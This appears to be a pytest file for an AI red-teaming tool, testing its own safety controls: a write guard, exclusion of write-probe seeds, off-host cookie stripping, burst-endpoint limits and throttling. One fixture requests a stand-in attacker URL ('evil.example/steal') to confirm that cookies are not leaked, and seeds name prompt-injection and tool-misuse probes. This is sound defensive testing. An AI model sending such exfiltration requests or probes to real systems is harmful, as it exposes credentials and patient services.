"""Blast-radius / platform-safety controls: the client-side write guard, write-probe
seed exclusion, and the burst-endpoint restriction. These make the 'read-only by
default' guarantee self-enforced rather than a doc promise."""
from __future__ import annotations

import pytest
import respx
from httpx import Response

from adversaryforge.config import Settings
from adversaryforge.redteam.seeds import Seed, SeedLibrary, Step
from adversaryforge.target.adapter import agentforge_adapter
from adversaryforge.target.client import TargetClient
from adversaryforge.target.session import AnonymousSession

BASE = "http://test.local"


def _s(**kw):
    return Settings(target_base_url=BASE, min_request_gap_s=0.0, max_concurrency=4, **kw)


async def test_write_guard_blocks_writes_by_default_and_never_sends():
    with respx.mock(assert_all_called=False) as router:
        route = router.post(f"{BASE}/v1/writes").mock(return_value=Response(200, json={}))
        async with TargetClient(agentforge_adapter(BASE), AnonymousSession(), _s()) as c:
            resp = await c.request("POST", "/v1/writes", json={"patient_id": 1, "value": "x"})
    assert resp.status_code == 0
    assert resp.error == "blocked_by_write_guard"
    assert not route.called  # the write was NEVER dispatched to the target


async def test_write_guard_allows_probe_with_opt_in():
    with respx.mock(assert_all_called=True) as router:
        router.post(f"{BASE}/v1/writes").mock(return_value=Response(503, json={}))
        async with TargetClient(agentforge_adapter(BASE), AnonymousSession(),
                                _s(allow_write_probe=True)) as c:
            resp = await c.request("POST", "/v1/writes", json={"patient_id": 1})
    assert resp.status_code == 503  # opt-in -> probe reaches the target (expects rejection)


async def test_write_guard_does_not_block_reads():
    with respx.mock(assert_all_called=True) as router:
        router.get(f"{BASE}/v1/writes/abc").mock(return_value=Response(404, json={}))
        async with TargetClient(agentforge_adapter(BASE), AnonymousSession(), _s()) as c:
            resp = await c.request("GET", "/v1/writes/abc")
    assert resp.status_code == 404  # GET is a read; the guard only blocks write verbs


async def test_write_guard_blocks_absolute_url_writes():
    # An ABSOLUTE-URL write step must be blocked too — the guard normalizes to the path
    # component, so https://host/v1/writes cannot slip past the "/v1/writes" prefix match.
    with respx.mock(assert_all_called=False) as router:
        route = router.post("https://test.local/v1/writes").mock(return_value=Response(200, json={}))
        async with TargetClient(agentforge_adapter(BASE), AnonymousSession(), _s()) as c:
            resp = await c.request("POST", "https://test.local/v1/writes", json={"patient_id": 1})
    assert resp.status_code == 0
    assert resp.error == "blocked_by_write_guard"
    assert not route.called  # the absolute-URL write was NEVER dispatched


def _write_seed():
    return Seed.model_validate({
        "id": "tm-write", "category": "tool_misuse", "title": "write probe",
        "target_invariant": "INV-WRITE-GATED", "expected_safe": "503/403", "requires_auth": True,
        "steps": [{"kind": "http", "method": "POST", "path": "/v1/writes",
                   "json_body": {"patient_id": 1}}]})


def _chat_seed():
    return Seed.model_validate({
        "id": "pi-x", "category": "prompt_injection", "title": "t",
        "target_invariant": "INV-INJECTION-INERT", "expected_safe": "inert", "requires_auth": True,
        "steps": [{"kind": "chat", "message": "hi", "patient_id": 1}]})


def test_write_probe_seeds_excluded_from_runnable_by_default():
    lib = SeedLibrary(seeds=[_write_seed(), _chat_seed()])
    assert _write_seed().is_write_probe is True
    assert _chat_seed().is_write_probe is False
    default_ids = {s.id for s in lib.runnable(authenticated=True, allow_write_probe=False)}
    assert "tm-write" not in default_ids  # excluded by default
    optin_ids = {s.id for s in lib.runnable(authenticated=True, allow_write_probe=True)}
    assert "tm-write" in optin_ids  # included only on explicit opt-in


class _CookieSession:
    """A session that carries a physician cookie — used to prove it never leaks off-host."""
    def headers(self):
        return {"Cookie": "sid=SECRET"}
    is_authenticated = True


async def test_session_cookie_not_sent_to_offhost_absolute_url():
    with respx.mock(assert_all_called=True) as router:
        route = router.get("https://evil.example/steal").mock(return_value=Response(200, json={}))
        async with TargetClient(agentforge_adapter(BASE), _CookieSession(), _s()) as c:
            await c.request("GET", "https://evil.example/steal")
    sent = {k.lower() for k in route.calls.last.request.headers.keys()}
    assert "cookie" not in sent  # the session cookie was NOT carried to a foreign host


async def test_session_cookie_sent_to_configured_host():
    with respx.mock(assert_all_called=True) as router:
        route = router.get(f"{BASE}/health").mock(return_value=Response(200, json={}))
        async with TargetClient(agentforge_adapter(BASE), _CookieSession(), _s()) as c:
            await c.request("GET", "/health")
    assert route.calls.last.request.headers.get("cookie") == "sid=SECRET"  # same-host DOES carry it


def test_write_probe_seed_via_upload_step_is_detected():
    # An upload_file step defaults to kind='chat' but compiles to a real method+path; a
    # write-shaped one must still be flagged/excluded (symmetric with the client guard).
    seed = Seed.model_validate({
        "id": "tm-upload-write", "category": "tool_misuse", "title": "upload write",
        "target_invariant": "INV-WRITE-GATED", "expected_safe": "503/403", "requires_auth": True,
        "steps": [{"kind": "chat", "method": "POST", "path": "/v1/writes/1/confirm",
                   "upload_file": {"filename": "x.txt", "content_type": "text/plain", "text": "hi"}}]})
    assert seed.is_write_probe is True


def test_write_probe_seed_with_absolute_url_is_still_detected():
    # is_write_probe must catch an absolute-URL (and query-carrying) write path, or a
    # hand-authored/mutated seed could smuggle a write onto a normal campaign.
    seed = Seed.model_validate({
        "id": "tm-write-abs", "category": "tool_misuse", "title": "abs write probe",
        "target_invariant": "INV-WRITE-GATED", "expected_safe": "503/403", "requires_auth": True,
        "steps": [{"kind": "http", "method": "POST",
                   "path": "https://test.local/v1/writes/1/confirm?a=b", "json_body": {"x": 1}}]})
    assert seed.is_write_probe is True


def test_burst_step_rejects_expensive_endpoints_at_load():
    Step.model_validate({"kind": "burst", "path": "/health", "burst_count": 10})  # ok
    Step.model_validate({"kind": "burst", "path": "/ready", "burst_count": 10})   # ok
    with pytest.raises(Exception):  # a real endpoint would make the burst a genuine DoS
        Step.model_validate({"kind": "burst", "path": "/v1/chat", "burst_count": 10})


async def test_self_throttle_paces_requests_to_bound_target_load():
    # The self-throttle (minimum inter-request gap) is the platform's PRIMARY control
    # against DoSing the clinical target — yet it was the one blast-radius control with
    # no test. Fire N concurrent requests and assert they were PACED: total wall time
    # >= (N-1) * min_gap, i.e. the throttle really serialized the inter-request spacing.
    import asyncio
    import time

    gap, n = 0.03, 5
    settings = Settings(target_base_url=BASE, min_request_gap_s=gap, max_concurrency=4)
    with respx.mock(assert_all_called=False) as router:
        router.get(f"{BASE}/health").mock(return_value=Response(200, json={}))
        async with TargetClient(agentforge_adapter(BASE), AnonymousSession(), settings) as c:
            t0 = time.perf_counter()
            await asyncio.gather(*[c.request("GET", "/health") for _ in range(n)])
            elapsed = time.perf_counter() - t0
    assert elapsed >= (n - 1) * gap * 0.9  # throttle enforced the inter-request spacing
